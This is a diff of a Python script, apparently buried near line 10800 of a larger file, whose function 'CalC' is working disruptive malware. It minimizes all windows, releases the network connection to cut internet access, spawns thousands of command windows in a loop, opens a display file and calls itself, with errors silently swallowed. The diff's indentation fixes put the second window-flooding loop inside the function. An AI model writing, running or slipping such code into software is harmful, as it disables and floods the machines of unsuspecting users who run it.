@@ -10800,7 +10800,7 @@
 import os
 try:
  def CalC():
-	 #1.minimise window && disable internet --(cmd1)
+  #1.minimise window && disable internet --(cmd1)
   cmd1="powershell -command \"& { $x = New-Object -ComObject Shell.Application; $x.minimizeall() }\" && ipconfig /release"
   os.system(cmd1)
   #2.Hide Taskbar && Create Display File -- (cmd2)
@@ -10810,10 +10810,10 @@ try:
   cmd36="start"
   for x in range(1,5000):
    os.system(cmd36)
-  #4.Open display file --(cmd3)
+  #4.Open display file --(cmd4)
   cmd4="zero.txt " 
   os.system(cmd4)
- for x in range(1,5000):
+  for x in range(1,5000):
    os.system(cmd36)
  CalC()
 except:
